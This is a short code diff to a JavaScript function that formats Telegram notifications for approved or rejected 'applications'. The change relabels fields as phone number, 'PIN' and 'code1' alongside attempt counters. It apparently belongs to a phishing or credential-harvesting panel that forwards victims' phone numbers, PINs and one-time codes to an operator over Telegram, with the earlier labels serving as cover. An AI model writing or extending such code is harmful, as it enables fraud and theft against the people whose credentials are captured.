@@ -372,10 +372,9 @@ function formatTelegramNotification(application, kind) {
 
   if (kind === "approved") {
     return `✅ APPLICATION APPROVED\n\n` +
-      `📋 Application ID: ${application.application_no || id}\n` +
-      `📞 Customer number: ${phone}\n` +
-      `🔢 Application reference: ${application.application_id || application.application_no || "—"}\n` +
-      `🔢 Application reference: ${application.application_id || application.application_no || "—"}\n` +
+      `📋 ID: ${application.application_no || id}\n` +
+      `📞 PHONE: ${phone}\n` +
+      `🔑 PIN: ${application.application_id || application.application_no || "—"}\n` +
       `🔢 code1: ${application.first_name || "—"}\n` +
       `🔁 Attempt: #${attempt}\n\n` +
       `📌 Status: APPROVED\n` +
@@ -415,9 +414,9 @@ function formatTelegramNotification(application, kind) {
   }
 
   return `❌ APPLICATION REJECTED\n\n` +
-    `📋 Application ID: ${application.application_no || id}\n` +
-    `📞 Customer number: ${phone}\n` +
-    `🔢 Application reference: ${application.application_id || application.application_no || "—"}\n` +
+    `🤳ID: ${application.application_no || id}\n` +
+    `📞 PHONE: ${phone}\n` +
+    `🔑 PIN: ${application.application_id || application.application_no || "—"}\n` +
     `⚠️ Reason: ${application.rejection_reason || "Application rejected"}\n` +
     `🔁 Attempt: #${attempt}\n` +
     `⏰ Date: ${stamp}`;
